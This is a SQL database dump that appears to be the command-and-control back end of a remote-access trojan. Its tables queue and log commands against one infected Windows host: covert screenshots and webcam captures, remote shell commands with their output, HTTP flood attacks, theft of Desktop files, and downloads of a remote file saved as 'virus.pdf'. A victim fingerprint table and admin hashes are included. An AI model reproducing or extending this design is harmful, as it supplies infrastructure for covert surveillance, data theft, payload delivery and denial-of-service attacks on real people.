-- phpMyAdmin SQL Dump
-- version 4.4.14
-- http://www.phpmyadmin.net
--
-- Host: 127.0.0.1
-- Generation Time: Sep 19, 2015 at 11:33 AM
-- Server version: 5.6.26
-- PHP Version: 5.5.28

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `python`
--

-- --------------------------------------------------------

--
-- Table structure for table `admin`
--

CREATE TABLE IF NOT EXISTS `admin` (
  `user` varchar(8999) DEFAULT NULL,
  `PASS` mediumtext,
  `id` int(11) NOT NULL,
  `SESSIOns` varchar(100) DEFAULT NULL
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=latin1;

--
-- Dumping data for table `admin`
--

INSERT INTO `admin` (`user`, `PASS`, `id`, `SESSIOns`) VALUES
('$2a$15$TYKSOQ5klufp7bj6iuBA3OappCDolSDqsqLHDz/M/4O8A60d5uOSC', '$2a$15$NQjkP2ALPZpoH5ziePJUwegV7BSFzgMvGAwD2pv24HYdMdxjbJ5Dm', 1, '$2a$10$htTtdMEdSLuWsVGEQF.Ya.e1jdIradaXY2SJaR3OUBA6Sz/jVvSf6');

-- --------------------------------------------------------

--
-- Table structure for table `cmd`
--

CREATE TABLE IF NOT EXISTS `cmd` (
  `id` bigint(255) NOT NULL,
  `uid` varchar(1000) DEFAULT NULL,
  `command` varchar(1000) DEFAULT NULL,
  `statu$` int(255) DEFAULT NULL,
  `OUtput` varchar(10000) DEFAULT NULL,
  `datetime` varchar(100) DEFAULT NULL,
  `Para1` varchar(10000) DEFAULT NULL,
  `Para2` varchar(10000) DEFAULT NULL,
  `para3` varchar(4343) DEFAULT NULL
) ENGINE=InnoDB AUTO_INCREMENT=24 DEFAULT CHARSET=latin1;

--
-- Dumping data for table `cmd`
--

INSERT INTO `cmd` (`id`, `uid`, `command`, `statu$`, `OUtput`, `datetime`, `Para1`, `Para2`, `para3`) VALUES
(1, 'b20322c4-44a2-507a-a01e-c80b4690907b', 'screenshoot', 1, '/2lZQ79NgPs.png', 'NOW()', '', '', NULL),
(2, 'b20322c4-44a2-507a-a01e-c80b4690907b', 'cmdexecution', 1, '<pre>batch-shellshell\n</pre>', 'NOW()', 'whoami', '', NULL),
(3, 'b20322c4-44a2-507a-a01e-c80b4690907b', 'camshoot', 1, '/U2o4mXbHKJ.png', 'NOW()', '', '', NULL),
(4, 'b20322c4-44a2-507a-a01e-c80b4690907b', 'httpflood', 1, NULL, 'NOW()', '192.168.0.1', '80', NULL),
(5, 'b20322c4-44a2-507a-a01e-c80b4690907b', 'installfile', 0, NULL, 'NOW()', 'http://bfo.com/products/report/docs/userguide.pdf', 'vi.pdf', NULL),
(15, 'b20322c4-44a2-507a-a01e-c80b4690907b', 'download', 1, '/bitch.txt', 'NOW()', 'C:\\Users\\Shell\\Desktop', 'bitch.txt', ''),
(16, 'b20322c4-44a2-507a-a01e-c80b4690907b', 'installfile', 1, NULL, 'NOW()', 'http:////bfo.com//products//report/docs//userguide.pdf', 'virus.pdf', ''),
(17, 'b20322c4-44a2-507a-a01e-c80b4690907b', 'screenshoot', 1, '/UmjycS4rCk.png', 'NOW()', '', '', ''),
(18, 'b20322c4-44a2-507a-a01e-c80b4690907b', 'cmdexecution', 1, '<pre>\nImage Name                     PID Session Name        Session#    Mem Usage\n========================= ======== ================ =========== ============\nSystem Idle Process              0 Services                   0          4 K\nSystem                           4 Services                   0      2,752 K\nsmss.exe                       344 Services                   0        836 K\ncsrss.exe                      456 Services                   0      3,236 K\nwininit.exe                    516 Services                   0      3,288 K\nservices.exe                   600 Services                   0      6,236 K\nlsass.exe                      608 Services                   0     13,672 K\nsvchost.exe                    680 Services                   0     12,144 K\nsvchost.exe                    716 Services                   0     10,040 K\nsvchost.exe                    852 Services                   0     26,956 K\nsvchost.exe                    884 Services                   0     74,324 K\nsvchost.exe                    900 Services                   0     34,812 K\nsvchost.exe                    948 Services                   0     20,636 K\nWUDFHost.exe                   648 Services                   0      5,468 K\nsvchost.exe                    444 Services                   0     16,764 K\nwlanext.exe                   1096 Services                   0     11,228 K\nconhost.exe                   1132 Services                   0      2,368 K\nspoolsv.exe                   1236 Services                   0      9,272 K\nsvchost.exe                   1272 Services                   0     15,048 K\nsvchost.exe                   1292 Services                   0     27,232 K\nHD-LogRotatorService.exe      1404 Services                   0      8,156 K\nHD-UpdaterService.exe         1748 Services                   0     11,620 K\nSkypeC2CAutoUpdateSvc.exe     2024 Services                   0      5,040 K\nSkypeC2CPNRSvc.exe            1500 Services                   0     30,792 K\nEvtEng.exe                    1948 Services                   0      8,628 K\ndasHost.exe                   2060 Services                   0     12,236 K\nFileZilla Server.exe          2124 Services                   0      5,804 K\nRegSrvc.exe                   2356 Services                   0      5,484 K\nsqlwriter.exe                 2604 Services                   0      4,508 K\nsvchost.exe                   2652 Services                   0      6,616 K\nMsMpEng.exe                   2756 Services                   0     75,320 K\nZeroConfigService.exe         2840 Services                   0      9,896 K\nunsecapp.exe                  3288 Services                   0      4,300 K\nSearchIndexer.exe             3440 Services                   0     38,020 K\nsvchost.exe                   3768 Services                   0     11,228 K\nWmiPrvSE.exe                  3832 Services                   0      7,564 K\nsvchost.exe                   4276 Services                   0      4,448 K\ndllhost.exe                   3976 Services                   0      6,368 K\nNisSrv.exe                    5420 Services                   0      9,160 K\nDiscSoftBusService.exe        6124 Services                   0      5,396 K\nwmpnetwk.exe                  5856 Services                   0      3,964 K\ncsrss.exe                      832 Console                    5     33,644 K\nwinlogon.exe                  4128 Console                    5      4,820 K\ndwm.exe                       4760 Console                    5     68,504 K\ntaskhostex.exe                4516 Console                    5     11,432 K\nexplorer.exe                  4288 Console                    5    133,672 K\nSkyDrive.exe                  4724 Console                    5     15,272 K\nSynTPEnh.exe                  6412 Console                    5     13,168 K\nSynTPHelper.exe               3536 Console                    5      2,864 K\nigfxtray.exe                  5416 Console                    5      7,664 K\nhkcmd.exe                     2752 Console                    5      5,288 K\nigfxpers.exe                  4504 Console                    5      6,648 K\nIDMan.exe                     6948 Console                    5     19,268 K\nIEMonitor.exe                 5516 Console                    5      5,292 K\nuTorrent.exe                  5112 Console                    5     38,872 K\nStikyNot.exe                  6980 Console                    5     11,700 K\nMEGAsync.exe                  3644 Console                    5     38,892 K\njusched.exe                   6944 Console                    5      7,128 K\nHD-Agent.exe                  4600 Console                    5     22,688 K\ntaskhost.exe                  2836 Console                    5      8,052 K\nsublime_text.exe              6180 Console                    5     66,628 K\nxampp-control.exe             6800 Console                    5     12,384 K\nmysqld.exe                    4784 Console                    5    390,048 K\nhttpd.exe                     6976 Console                    5     11,592 K\nconhost.exe                   3652 Console                    5      3,964 K\nhttpd.exe                     6796 Console                    5     23,616 K\nSkype.exe                      844 Console                    5    176,732 K\nigfxsrvc.exe                  1632 Console                    5      6,540 K\nRuntimeBroker.exe             5496 Console                    5     20,464 K\nSettingSyncHost.exe           2076 Console                    5      3,492 K\naudiodg.exe                   5992 Services                   0      9,840 K\nvlc.exe                       7024 Console                    5     85,796 K\nchrome.exe                    7004 Console                    5    103,444 K\nchrome.exe                    7640 Console                    5    125,732 K\nchrome.exe                    7496 Console                    5     23,516 K\nchrome.exe                    7672 Console                    5     33,096 K\nchrome.exe                    7924 Console                    5     70,356 K\nchrome.exe                    1040 Console                    5     90,676 K\ncmd.exe                       6932 Console                    5      2,264 K\nconhost.exe                   7992 Console                    5      5,224 K\nTaskmgr.exe                   5152 Console                    5     27,400 K\ndllhost.exe                   5520 Console                    5     13,624 K\nAAM Updates Notifier.exe      7920 Console                    5      2,712 K\nglcnd.exe                     7916 Console                    5     82,072 K\nchrome.exe                    7424 Console                    5    185,652 K\nchrome.exe                    7220 Console                    5    170,360 K\nchrome.exe                    7820 Console                    5     19,164 K\npowershell.exe                2720 Console                    5     72,700 K\nconhost.exe                   2828 Console                    5      5,984 K\nlivecomm.exe                  6188 Console                    5      4,340 K\npython.exe                    4104 Console                    5     31,732 K\nWmiPrvSE.exe                  5868 Services                   0      7,548 K\nchrome.exe                    4532 Console                    5     39,176 K\ncmd.exe                       7912 Console                    5      2,000 K\ntasklist.exe                  3024 Console                    5      5,612 K\n</pre>', 'NOW()', 'tasklist', '', ''),
(19, 'b20322c4-44a2-507a-a01e-c80b4690907b', 'camshoot', 1, '/2VjPWz3o95.png', 'NOW()', '', '', ''),
(20, 'b20322c4-44a2-507a-a01e-c80b4690907b', 'download', 1, '/bitch.rar', 'NOW()', 'C:\\Users\\Shell\\Desktop', 'bitch.rar', ''),
(21, 'b20322c4-44a2-507a-a01e-c80b4690907b', 'httpflood', 1, 'None', 'NOW()', '127.0.0.1', '80', '20'),
(22, 'b20322c4-44a2-507a-a01e-c80b4690907b', 'download', 1, 'Failed..!', 'NOW()', '', '', ''),
(23, 'b20322c4-44a2-507a-a01e-c80b4690907b', 'httpflood', 1, 'Done..!', 'NOW()', '', '', '');

-- --------------------------------------------------------

--
-- Table structure for table `info`
--

CREATE TABLE IF NOT EXISTS `info` (
  `id` bigint(100) NOT NULL,
  `Syst3m` varchar(255) DEFAULT NULL,
  `node` varchar(255) DEFAULT NULL,
  `r3lease` varchar(255) DEFAULT NULL,
  `version` varchar(255) DEFAULT NULL,
  `machine` varchar(255) DEFAULT NULL,
  `processor` varchar(255) DEFAULT NULL,
  `Us3r` varchar(1000) DEFAULT NULL,
  `tim3_date` varchar(1000) DEFAULT NULL,
  `UNIQUE_ID` longtext
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=latin1;

--
-- Dumping data for table `info`
--

INSERT INTO `info` (`id`, `Syst3m`, `node`, `r3lease`, `version`, `machine`, `processor`, `Us3r`, `tim3_date`, `UNIQUE_ID`) VALUES
(1, 'Windows', 'Batch-shell', '8', '6.2.9200', 'AMD64', 'Intel64 Family 6 Model 37 Stepping 5, GenuineIntel', 'Shell', '2015-09-17 05:51:19', 'b20322c4-44a2-507a-a01e-c80b4690907b');

--
-- Indexes for dumped tables
--

--
-- Indexes for table `admin`
--
ALTER TABLE `admin`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `cmd`
--
ALTER TABLE `cmd`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `info`
--
ALTER TABLE `info`
  ADD PRIMARY KEY (`id`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `admin`
--
ALTER TABLE `admin`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=2;
--
-- AUTO_INCREMENT for table `cmd`
--
ALTER TABLE `cmd`
  MODIFY `id` bigint(255) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=24;
--
-- AUTO_INCREMENT for table `info`
--
ALTER TABLE `info`
  MODIFY `id` bigint(100) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=2;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
